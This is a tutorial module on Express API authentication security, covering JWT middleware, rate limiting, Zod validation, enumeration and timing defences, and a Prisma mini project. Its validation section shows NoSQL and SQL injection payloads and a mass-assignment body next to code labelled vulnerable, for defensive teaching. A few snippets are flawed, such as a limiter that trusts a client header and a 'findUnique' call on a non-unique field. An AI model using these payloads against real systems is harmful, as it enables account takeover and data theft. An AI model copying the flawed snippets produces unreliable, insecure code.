    req.tokenJti = payload.jti;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired', code: 'TOKEN_EXPIRED' });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
};

// Optional authentication (attaches user if present, doesn't fail)
const optionalAuth = (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (authHeader?.startsWith('Bearer ')) {
    try {
      const payload = jwt.verify(authHeader.slice(7), process.env.JWT_ACCESS_SECRET, {
        algorithms: ['HS256']
      });
      req.userId = payload.sub;
    } catch {
      // Invalid token, but that's okay for optional auth
    }
  }
  
  next();
};

// Combined middleware stack
const requireAuth = [authenticateJWT];
const requireAdmin = [authenticateJWT, requireRole('admin')];

module.exports = { authenticateJWT, optionalAuth, requireAuth, requireAdmin };
```

```javascript
// Usage in routes
const { authenticateJWT, requireAdmin } = require('./middleware/auth');
const { requirePermission } = require('./middleware/rbac');

// Public route
app.get('/api/products', listProducts);

// Authenticated route
app.post('/api/orders', authenticateJWT, createOrder);

// Role-protected route
app.get('/api/admin/dashboard', ...requireAdmin, getDashboard);

// Permission-protected route
app.delete('/api/posts/:id', authenticateJWT, requirePermission('post:delete'), deletePost);

// Optional auth ( personalize experience if logged in)
app.get('/api/products/:id', optionalAuth, getProductDetails);
```

### WHY Middleware?

- **Single responsibility:** Auth logic lives in one place, not duplicated in every handler
- **Composability:** Mix and match `authenticateJWT`, `requireRole`, `rateLimit` as needed
- **Testability:** Test middleware in isolation
- **Consistency:** Every protected route gets the same security checks

---

## 10. Rate Limiting Auth Endpoints

### WHY Rate Limit Auth Endpoints?

Authentication endpoints are the #1 target for brute-force attacks. Without rate limiting:
- Attackers can try thousands of password combinations per second
- Credential stuffing attacks (using leaked passwords from other breaches) are trivial
- Account lockouts can be used as a DoS vector against legitimate users

**Real-world impact:** A fintech startup experienced 450,000 login attempts per hour during a credential stuffing attack. Without rate limiting, their database CPU hit 100%, legitimate users couldn't log in, and 3% of accounts were compromised.

### Implementation

```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const { createClient } = require('redis');

const redisClient = createClient({ url: process.env.REDIS_URL });
redisClient.connect();

// General API rate limiting
const generalLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:general:'
  }),
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                  // 100 requests per window
  standardHeaders: true,     // Return RateLimit-* headers
  legacyHeaders: false,
  keyGenerator: (req) => req.ip,
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many requests',
      retryAfter: Math.ceil(res.getHeader('Retry-After'))
    });
  }
});

// STRICT limiter for authentication endpoints
const authLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:auth:'
  }),
  windowMs: 60 * 60 * 1000,  // 1 hour
  max: 10,                   // 10 attempts per hour
  skipSuccessfulRequests: true,  // Only count FAILED attempts
  keyGenerator: (req) => {
    // Rate limit by IP + email combination
    return `${req.ip}:${req.body.email || req.body.username || 'unknown'}`;
  },
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many login attempts. Please try again later.',
      retryAfter: Math.ceil(res.getHeader('Retry-After'))
    });
  }
});

// Apply limiters
app.use('/api/', generalLimiter);
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/register', authLimiter);
app.use('/api/auth/forgot-password', authLimiter);
```

### WHAT HAPPENS If You Don't Rate Limit?

**Scenario: No rate limiting on login**
1. Attacker compiles a list of 10,000 email/password pairs from previous breaches
2. Attacker scripts a login attempt every 100ms = 36,000 attempts/hour
3. Your server processes all of them
4. 50 accounts are compromised (0.5% success rate)
5. Attacker drains wallets, spams from accounts, or sells access

**With rate limiting (10 attempts/hour):**
1. Same attack
2. After 10 attempts, attacker is blocked for 1 hour
3. Attack duration extends from 17 minutes to 2,000 hours (impossible)
4. Success rate drops to effectively zero

### Advanced: Progressive Rate Limiting

```javascript
const progressiveLimiter = rateLimit({
  store: new RedisStore({ client: redisClient, prefix: 'rl:progressive:' }),
  windowMs: 60 * 1000,  // 1 minute base window
  max: (req, res) => {
    // Progressive: More failures = stricter limits
    const failures = parseInt(req.headers['x-failure-count'] || '0');
    return Math.max(1, 10 - failures);
  },
  keyGenerator: (req) => req.ip
});
```

---

## 11. Input Validation & Injection Prevention

### WHAT Happens If You Skip Input Validation?

**NoSQL Injection Attack:**

```json
POST /api/login
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}
```

If your code passes `req.body` directly to MongoDB:
```javascript
// VULNERABLE: Direct object pass-through
const user = await db.collection('users').findOne(req.body);
```

The query becomes: "Find a user where username is not null AND password is not null" — which matches EVERY user. Authentication bypassed.

**SQL Injection Attack:**

```
GET /api/users?name=admin' UNION SELECT username,password FROM users--
```

If your code concatenates strings:
```javascript
// VULNERABLE: String concatenation
const result = await db.query(`SELECT * FROM users WHERE name = '${name}'`);
```

The attacker just exfiltrated your entire user table.

### WHY Zod for Validation?

| Feature | Zod | Joi | class-validator |
|---------|-----|-----|-----------------|
| Type Safety | Native TypeScript | @types/joi | Decorators |
| Bundle Size | ~12KB | ~100KB | ~40KB |
| Performance | Fast | Fast | Slower |
| Schema Composition | Excellent | Good | Moderate |

**Zod provides native TypeScript inference:** your validation schema IS your type definition.

### Implementation

```javascript
const { z } = require('zod');

// Schema definitions
const schemas = {
  register: z.object({
    email: z.string()
      .email('Invalid email format')
      .toLowerCase()
      .trim()
      .max(255),
    password: z.string()
      .min(12, 'Password must be at least 12 characters')
      .max(128)
      .regex(/[A-Z]/, 'Must contain uppercase')
      .regex(/[a-z]/, 'Must contain lowercase')
      .regex(/[0-9]/, 'Must contain number')
      .regex(/[^A-Za-z0-9]/, 'Must contain special character'),
    name: z.string()
      .min(2)
      .max(100)
      .trim()
  }),
  
  login: z.object({
    email: z.string().email().toLowerCase().trim(),
    password: z.string().min(1)
  }),
  
  createPost: z.object({
    title: z.string().min(1).max(200).trim(),
    content: z.string().min(1).max(50000),
    published: z.boolean().default(false)
  })
};

// Validation middleware factory
const validate = (schema) => {
  return async (req, res, next) => {
    try {
      req.body = await schema.parseAsync(req.body);
      next();
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          error: 'Validation failed',
          details: err.errors.map(e => ({
            field: e.path.join('.'),
            message: e.message
          }))
        });
      }
      next(err);
    }
  };
};

// Usage
app.post('/api/auth/register', validate(schemas.register), registerHandler);
app.post('/api/auth/login', validate(schemas.login), loginHandler);
```

### WHAT HAPPENS If You Don't Validate?

**The Mass Assignment Vulnerability:**

```javascript
// DANGEROUS: Allowing any field to be updated
app.put('/api/users/:id', authenticate, async (req, res) => {
  await db.users.update(req.params.id, req.body); 
  // User can set role: 'admin', password: 'hacked', etc.
});
```

Attacker sends:
```json
{
  "name": "Hacker",
  "role": "admin",
  "password": "hacked123"
}
```

Result: Regular user becomes admin. This pattern has compromised major platforms including GitHub (2012), Facebook (2011), and countless startups.

**The Fix:**
```javascript
const ALLOWED_USER_FIELDS = ['displayName', 'bio', 'avatarUrl'];

app.put('/api/users/:id', authenticate, async (req, res) => {
  const updates = {};
  for (const field of ALLOWED_USER_FIELDS) {
    if (req.body[field] !== undefined) {
      updates[field] = req.body[field];
    }
  }
  
  await db.users.update(req.params.id, updates);
});
```

---

## 12. User Enumeration & Timing Attacks

### WHAT Is User Enumeration?

User enumeration is an information leak where an attacker can determine whether a username/email exists in your system based on subtle differences in responses.

**Vulnerable response:**
```javascript
app.post('/api/auth/login', async (req, res) => {
  const user = await db.users.findByEmail(req.body.email);
  if (!user) {
    return res.status(401).json({ error: 'User not found' });  // LEAK!
  }
  
  const valid = await verifyPassword(req.body.password, user.password);
  if (!valid) {
    return res.status(401).json({ error: 'Incorrect password' });  // LEAK!
  }
  
  // ...
});
```

Attacker tries `admin@company.com`:
- "User not found" → account doesn't exist
- "Incorrect password" → account EXISTS, just need the password

This enables targeted phishing and credential stuffing.

### WHY Timing Attacks Matter

Even if your error message is identical, the **response time** leaks information:
- User not found: 5ms (just a DB lookup)
- Wrong password: 250ms (DB lookup + bcrypt/argon2 hash)

Attacker measures response times to determine account existence.

### The Fix

```javascript
const hashPassword = require('./auth');

app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // ALWAYS perform both lookups
  const user = await db.users.findByEmail(email);
  
  // If user doesn't exist, hash a dummy password to consume time
  // This prevents timing attacks
    const hashToVerify = user ? user.password : '$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHRzb21lc2FsdA$ZGlmZmljdWx0aGVyZXN1bHR0aGF0aXN2YWxpZGZvcnRoaXNob3U';
  const valid = await verifyPassword(password, hashToVerify);
  
  // Generic error message regardless of failure reason
  if (!user || !valid) {
    return res.status(401).json({ 
      error: 'Invalid email or password' 
    });
  }
  
  // Success
  const accessToken = createAccessToken(user);
  const refreshToken = await createRefreshToken(user.id);
  
  res.json({ accessToken, refreshToken });
});
```

**Key principles:**
1. **Same error message:** Never distinguish between "user not found" and "wrong password"
2. **Constant time:** Always perform the hash verification, even if user doesn't exist
3. **404 not 403:** For resource access, return 404 (not found) instead of 403 (forbidden) to prevent ID enumeration

### Registration Enumeration

**Vulnerable:**
```javascript
app.post('/api/auth/register', async (req, res) => {
  const existing = await db.users.findByEmail(req.body.email);
  if (existing) {
    return res.status(409).json({ error: 'Email already registered' });  // LEAK!
  }
  // ...
});
```

**Secure alternatives:**

```javascript
// Option 1: Return success but send email saying "already registered"
app.post('/api/auth/register', async (req, res) => {
  const existing = await db.users.findByEmail(req.body.email);
  
  if (existing) {
    await sendEmail(req.body.email, 'Account already exists', 
      'Someone tried to register with this email. If it was you, log in instead.');
  } else {
    await createUser(req.body);
    await sendEmail(req.body.email, 'Welcome!', 'Verify your account...');
  }
  
  // Same response regardless
  res.status(200).json({ 
    message: 'If this email is not registered, you will receive a verification email.' 
  });
});

### Account Lockout Pattern

To prevent brute-force attacks even with identical error messages, implement progressive account lockout:

```javascript
const MAX_ATTEMPTS = 10;
const LOCKOUT_DURATION_MS = 15 * 60 * 1000; // 15 minutes

app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await db.users.findByEmail(email);
  
  // Check if account is locked
  if (user && user.lockedUntil && user.lockedUntil > new Date()) {
    return res.status(429).json({ 
      error: 'Account temporarily locked. Try again later.' 
    });
  }
  
  const hashToVerify = user ? user.password : dummyHash;
  const valid = await verifyPassword(password, hashToVerify);
  
  if (!user || !valid) {
    if (user) {
      // Increment failed attempts
      const attempts = (user.failedAttempts || 0) + 1;
      const updates = { failedAttempts: attempts };
      
      if (attempts >= MAX_ATTEMPTS) {
        updates.lockedUntil = new Date(Date.now() + LOCKOUT_DURATION_MS);
      }
      
      await db.users.update(user.id, updates);
    }
    
    return res.status(401).json({ error: 'Invalid email or password' });
  }
  
  // Success: reset counter
  if (user.failedAttempts > 0) {
    await db.users.update(user.id, { failedAttempts: 0, lockedUntil: null });
  }
  
  // ... issue tokens
});
```

> **Important:** Always return 401 for invalid credentials and only 429 when the account is explicitly locked. Never reveal whether an email exists through lockout behavior.

---

## 13. Mini Project: Complete Auth System

### Project Requirements

Build a complete authentication system with:
- User registration with Argon2id hashing
- Login with JWT access tokens + refresh token rotation
- Protected routes with middleware
- Admin and User roles
- Rate limiting on auth endpoints
- Input validation with Zod
- Secure cookie storage option

### Step 1: Project Structure

```
auth-system/
├── prisma/
│   ├── schema.prisma
│   └── seed.ts
├── src/
│   ├── index.ts
│   ├── routes/
│   │   ├── auth.ts
│   │   └── users.ts
│   ├── middleware/
│   │   ├── auth.ts
│   │   ├── rbac.ts
│   │   ├── validate.ts
│   │   └── rateLimit.ts
│   ├── services/
│   │   ├── auth.ts
│   │   └── token.ts
│   └── utils/
│       └── errors.ts
├── .env
├── docker-compose.yml
└── package.json
```

### Step 2: Prisma Schema

```prisma
// prisma/schema.prisma

generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

model User {
  id            Int            @id @default(autoincrement())
  email         String         @unique
  password      String
  name          String
  roles         UserRole[]
  refreshTokens RefreshToken[]
  createdAt     DateTime       @default(now()) @map("created_at")
  updatedAt     DateTime       @updatedAt @map("updated_at")
  
  @@map("users")
}

model Role {
  id          Int           @id @default(autoincrement())
  name        String        @unique
  permissions Permission[]
  users       UserRole[]
  
  @@map("roles")
}

model Permission {
  id    Int    @id @default(autoincrement())
  name  String @unique
  roles Role[]
  
  @@map("permissions")
}

model UserRole {
  userId Int
  roleId Int
  user   User @relation(fields: [userId], references: [id], onDelete: Cascade)
  role   Role @relation(fields: [roleId], references: [id], onDelete: Cascade)
  
  @@id([userId, roleId])
  @@map("user_roles")
}

model RefreshToken {
  id        Int      @id @default(autoincrement())
  tokenHash String   @map("token_hash")
  family    String
  userId    Int      @map("user_id")
  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)
  issuedAt  DateTime @default(now()) @map("issued_at")
  expiresAt DateTime @map("expires_at")
  revokedAt DateTime? @map("revoked_at")
  replacedBy String? @map("replaced_by")
  
  @@index([tokenHash])
  @@map("refresh_tokens")
}
```

### Step 3: Auth Services

```typescript
// src/services/auth.ts
import argon2 from 'argon2';
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

export const hashPassword = async (password: string): Promise<string> => {
  return argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 65536,
    timeCost: 3,
    parallelism: 4
  });
};

export const verifyPassword = async (password: string, hash: string): Promise<boolean> => {
  try {
    return await argon2.verify(hash, password);
  } catch {
    return false;
  }
};

export const findUserByEmail = async (email: string) => {
  return prisma.user.findUnique({
    where: { email: email.toLowerCase() },
    include: {
      roles: {
        include: {
          role: {
            include: {
              permissions: true
            }
          }
        }
      }
    }
  });
};

export const createUser = async (email: string, password: string, name: string) => {
  const hashedPassword = await hashPassword(password);
  
  // Default role: 'user'
  const userRole = await prisma.role.findUnique({
    where: { name: 'user' }
  });
  
  return prisma.user.create({
    data: {
      email: email.toLowerCase(),
      password: hashedPassword,
      name,
      roles: {
        create: {
          roleId: userRole!.id
        }
      }
    },
    include: {
      roles: {
        include: {
          role: true
        }
      }
    }
  });
};
```

```typescript
// src/services/token.ts
import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

const ACCESS_TOKEN_SECRET = process.env.JWT_ACCESS_SECRET!;
const REFRESH_TOKEN_SECRET = process.env.JWT_REFRESH_SECRET!;

export const createAccessToken = (userId: number, roles: string[]) => {
  return jwt.sign(
    { sub: userId, roles },
    ACCESS_TOKEN_SECRET,
    {
      expiresIn: '15m',
      issuer: 'auth-system',
      audience: 'auth-system-client'
    }
  );
};

export const verifyAccessToken = (token: string) => {
  return jwt.verify(token, ACCESS_TOKEN_SECRET, {
    algorithms: ['HS256'],
    issuer: 'auth-system',
    audience: 'auth-system-client'
  });
};

export const createRefreshToken = async (userId: number) => {
  const token = crypto.randomBytes(64).toString('base64url');
  const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
  const family = crypto.randomUUID();
  
  await prisma.refreshToken.create({
    data: {
      tokenHash,
      family,
      userId,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
    }
  });
  
  return token;
};

export const rotateRefreshToken = async (incomingToken: string) => {
  const incomingHash = crypto.createHash('sha256').update(incomingToken).digest('hex');
  
  const storedToken = await prisma.refreshToken.findUnique({
    where: { tokenHash: incomingHash },
    include: { user: { include: { roles: { include: { role: true } } } } }
  });
  
  if (!storedToken || storedToken.revokedAt || storedToken.expiresAt < new Date()) {
    throw new Error('Invalid refresh token');
  }
  
  // Reuse detection
  if (storedToken.replacedBy) {
    await prisma.refreshToken.updateMany({
      where: { family: storedToken.family },
      data: { revokedAt: new Date() }
    });
    throw new Error('Token reuse detected');
  }
  
  // Generate new tokens
  const roles = storedToken.user.roles.map(ur => ur.role.name);
  const newAccessToken = createAccessToken(storedToken.userId, roles);
  const newRefreshToken = await createRefreshToken(storedToken.userId);
  const newRefreshHash = crypto.createHash('sha256').update(newRefreshToken).digest('hex');
  
  // Mark old as replaced
  await prisma.refreshToken.update({
    where: { id: storedToken.id },
    data: { replacedBy: newRefreshHash }
  });
  
  return { accessToken: newAccessToken, refreshToken: newRefreshToken };
};
```

### Step 4: Middleware

```typescript
// src/middleware/auth.ts
import { Request, Response, NextFunction } from 'express';
import { verifyAccessToken } from '../services/token';

export interface AuthRequest extends Request {
  userId?: number;
  userRoles?: string[];
}

export const authenticate = (req: AuthRequest, res: Response, next: NextFunction) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing authorization header' });
  }
  
  try {
    const payload = verifyAccessToken(authHeader.slice(7)) as any;
    req.userId = payload.sub;
    req.userRoles = payload.roles;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }
};

export const requireRole = (...roles: string[]) => {
  return (req: AuthRequest, res: Response, next: NextFunction) => {
    if (!req.userRoles?.some(role => roles.includes(role))) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
};
```

```typescript
// src/middleware/validate.ts
import { z, ZodError } from 'zod';
import { Request, Response, NextFunction } from 'express';

export const validate = (schema: z.ZodSchema) => {
  return (req: Request, res: Response, next: NextFunction) => {
    try {
      req.body = schema.parse(req.body);
      next();
    } catch (err) {
      if (err instanceof ZodError) {
        return res.status(400).json({
          error: 'Validation failed',
          details: err.errors.map(e => ({
            field: e.path.join('.'),
            message: e.message
          }))
        });
      }
      next(err);
    }
  };
};
```

### Step 5: Routes

```typescript
// src/routes/auth.ts
import { Router } from 'express';
import { z } from 'zod';
import { validate } from '../middleware/validate';
import { createUser, findUserByEmail, verifyPassword } from '../services/auth';
import { createAccessToken, createRefreshToken, rotateRefreshToken } from '../services/token';

const router = Router();

const registerSchema = z.object({
  email: z.string().email().toLowerCase().trim(),
  password: z.string().min(12).max(128),
  name: z.string().min(2).max(100).trim()
});

const loginSchema = z.object({
  email: z.string().email().toLowerCase().trim(),
  password: z.string().min(1)
});

router.post('/register', validate(registerSchema), async (req, res) => {
  try {
    const { email, password, name } = req.body;
    
    const existing = await findUserByEmail(email);
    if (existing) {
      // Don't leak that email exists — perform a dummy hash to maintain constant time
      await verifyPassword(password, '$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHRzb21lc2FsdA$ZGlmZmljdWx0aGVyZXN1bHR0aGF0aXN2YWxpZGZvcnRoaXNob3U');
      return res.status(200).json({
        message: 'If this email is not registered, you will receive a confirmation.'
      });
    }
    
    const user = await createUser(email, password, name);
    const accessToken = createAccessToken(user.id, ['user']);
    const refreshToken = await createRefreshToken(user.id);
    
    res.status(201).json({ accessToken, refreshToken });
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ error: 'Registration failed' });
  }
});

router.post('/login', validate(loginSchema), async (req, res) => {
  try {
    const { email, password } = req.body;
    
    const user = await findUserByEmail(email);
    
    // Constant-time comparison to prevent timing attacks
    const dummyHash = '$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHRzb21lc2FsdA$ZGlmZmljdWx0aGVyZXN1bHR0aGF0aXN2YWxpZGZvcnRoaXNob3U';
    const hashToCheck = user ? user.password : dummyHash;
    const valid = await verifyPassword(password, hashToCheck);
    
    if (!user || !valid) {
      return res.status(401).json({ error: 'Invalid email or password' });
    }
    
    const roles = user.roles.map(ur => ur.role.name);
    const accessToken = createAccessToken(user.id, roles);
    const refreshToken = await createRefreshToken(user.id);
    
    res.json({ accessToken, refreshToken });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Login failed' });
  }
});

router.post('/refresh', async (req, res) => {
  try {
    const { refreshToken } = req.body;
    
    if (!refreshToken) {
      return res.status(401).json({ error: 'Refresh token required' });
    }
    
    const tokens = await rotateRefreshToken(refreshToken);
    res.json(tokens);
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});

export default router;
```

> **Email Verification Note:** The registration example above immediately creates an active account. In production, you should require email verification before the account is fully activated:
> 1. After registration, set `emailVerified` to `null` and generate a secure random token
> 2. Send a verification email with a link containing the token
> 3. Store the token hash (not the raw token) with an expiration time
> 4. On verification, mark `emailVerified` and delete the token
> 5. Restrict sensitive operations (password reset, API access) until verified
>
> Never return access tokens from the register endpoint until the email is verified.

```typescript
// src/routes/users.ts
import { Router } from 'express';
import { z } from 'zod';
import { authenticate, requireRole, AuthRequest } from '../middleware/auth';
import { PrismaClient } from '@prisma/client';

const router = Router();
const prisma = new PrismaClient();

// Any authenticated user can see their own profile
router.get('/me', authenticate, async (req: AuthRequest, res) => {
  const user = await prisma.user.findUnique({
    where: { id: req.userId },
    select: { id: true, email: true, name: true, createdAt: true }
  });
  
  res.json(user);
});

// Only admins can list all users
router.get('/', authenticate, requireRole('admin'), async (req, res) => {
  const users = await prisma.user.findMany({
    select: { id: true, email: true, name: true, createdAt: true },
    take: 100
  });
  
  res.json(users);
});

// Only admins can delete users
router.delete('/:id', authenticate, requireRole('admin'), async (req, res) => {
  const id = z.coerce.number().int().positive().parse(req.params.id);
  await prisma.user.delete({ where: { id } });
  res.status(204).send();
});

export default router;
```

### Step 6: Main Application

```typescript
// src/index.ts
import express from 'express';
import rateLimit from 'express-rate-limit';
import authRoutes from './routes/auth';
import userRoutes from './routes/users';

const app = express();

app.use(express.json({ limit: '10kb' }));

// Rate limiting
const authLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 10,
  message: { error: 'Too many attempts. Try again later.' }
});

app.use('/api/auth/login', authLimiter);
app.use('/api/auth/register', authLimiter);

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/users', userRoutes);

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});

// Error handler
app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
  console.error(err);
  res.status(err.status || 500).json({
    error: process.env.NODE_ENV === 'production' ? 'Internal server error' : err.message
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Auth server running on port ${PORT}`);
});
```

### Step 7: Seed Roles

```typescript
// prisma/seed.ts
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

async function main() {
  // Create permissions
  const permissions = [
    'user:create', 'user:read', 'user:update', 'user:delete',
    'post:create', 'post:read', 'post:update', 'post:delete'
  ];
  
  for (const name of permissions) {
    await prisma.permission.upsert({
      where: { name },
      update: {},
      create: { name }
    });
  }
  
  // Create roles with permissions
  const adminRole = await prisma.role.upsert({
    where: { name: 'admin' },
    update: {},
    create: {
      name: 'admin',
      permissions: {
        connect: await prisma.permission.findMany({ select: { id: true } })
      }
    }
  });
  
  const userRole = await prisma.role.upsert({
    where: { name: 'user' },
    update: {},
    create: {
      name: 'user',
      permissions: {
        connect: [
          { name: 'post:create' },
          { name: 'post:read' },
          { name: 'post:update' },
          { name: 'user:read' },
          { name: 'user:update' }
        ]
      }
    }
  });
  
  console.log('Seeded roles and permissions');
}

main()
  .catch(console.error)
  .finally(() => prisma.$disconnect());
```

### Step 8: Run and Test

```bash
# Setup
docker compose up -d
npx prisma migrate dev --name init_auth
npx prisma db seed

# Start server
npm run dev

# Test registration
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"SecurePass123!","name":"Alice"}'

# Test login
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"SecurePass123!"}'

# Test protected route
curl http://localhost:3000/api/users/me \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"
```

---

## 14. Summary & Security Checklist

### Key Takeaways

| Concept | Remember This |
|---------|--------------|
| **AuthN vs AuthZ** | Authentication = who you are. Authorization = what you can do. You need BOTH. |
| **Password Hashing** | Use Argon2id (or bcrypt). NEVER use MD5/SHA1. Crack time difference: minutes vs millions of years. |
| **JWT Storage** | Never localStorage. Use httpOnly, Secure, SameSite=Strict cookies. |
| **JWT Secrets** | Min 256-bit random. Rotate regularly. Weak secrets = forged tokens. |
| **Refresh Tokens** | Rotate them. Detect reuse. Short-lived access + long-lived refresh is the modern pattern. |
| **Sessions** | Use Redis. Regenerate ID on login. Bind to device fingerprint. |
| **OAuth 2.1** | PKCE is mandatory. Implicit grant is dead. Exact redirect URI matching required. |
| **RBAC** | Centralize permissions. Never scatter auth logic across handlers. |
| **Rate Limiting** | 10 login attempts/hour. Use Redis for distributed counting. |
| **Input Validation** | Zod for everything. Never trust client input. |
| **User Enumeration** | Same error for "not found" and "wrong password". Constant-time verification. |

### Module 04 Security Checklist

#### Authentication & Authorization
- [ ] Use Argon2id or bcrypt for password hashing (never MD5/SHA1)
- [ ] Implement refresh token rotation with reuse detection
- [ ] Use OAuth 2.1 with PKCE for third-party auth
- [ ] Validate JWT `alg` header explicitly
- [ ] Implement proper session management (regenerate on login)
- [ ] Enforce authorization at the data layer (prevent IDOR)
- [ ] Use RBAC with centralized policy engine

#### Input Validation
- [ ] Validate ALL inputs with Zod (path, query, body, headers)
- [ ] Use parameterized queries (never string concatenation)
- [ ] Set request body size limits (`express.json({ limit: '10kb' })`)
- [ ] Explicit allow-list for mass assignment fields

#### Security Headers & Middleware
- [ ] Configure Helmet with strict CSP
- [ ] CORS with whitelist (never `*` with credentials)
- [ ] Rate limiting with Redis (general + auth + per-user)
- [ ] HTTPS only (HSTS with preload)
- [ ] SameSite=Strict cookies

#### Vulnerability Prevention
- [ ] CSRF protection (SameSite cookies + state validation)
- [ ] XSS prevention (auto-escaping templates, CSP)
- [ ] Race condition protection (atomic DB ops, locking)
- [ ] Dependency scanning (`npm audit`, Snyk, Dependabot)

### The OWASP API Top 10 (2023) Mapping

| OWASP Risk | How This Module Protects You |
|------------|------------------------------|
| **API1: Broken Object Level Authorization** | RBAC + data-layer ownership checks |
| **API2: Broken Authentication** | Argon2id, JWT best practices, refresh rotation |
| **API3: Broken Object Property Level Authorization** | Zod validation + explicit allow-lists |
| **API4: Unrestricted Resource Consumption** | Rate limiting, body size limits |
| **API5: Broken Function Level Authorization** | `requireRole` middleware on all admin endpoints |
| **API6: Unrestricted Access to Sensitive Flows** | Progressive rate limiting, device fingerprinting |
| **API7: Server Side Request Forgery** | URL validation, IP blocklists |
| **API8: Security Misconfiguration** | Helmet, custom error handlers, no stack traces |
| **API9: Improper Inventory Management** | API versioning, deprecation headers |
| **API10: Unsafe Consumption of APIs** | Zod validation of all external data |

### Remember

> **Security is not a feature you add at the end. It's a property of the system you build from day one.**

The most expensive security bug is the one you could have prevented with basic hygiene: hashing passwords properly, validating inputs, checking permissions, and rate limiting auth endpoints.

---

> **Next Module:** Module 05 - Testing & Deployment. Learn to write integration tests for your auth system, set up CI/CD pipelines, and deploy securely.

*Last updated: 2026-05-06 | OAuth 2.1 | Argon2id | OWASP API Top 10 2023*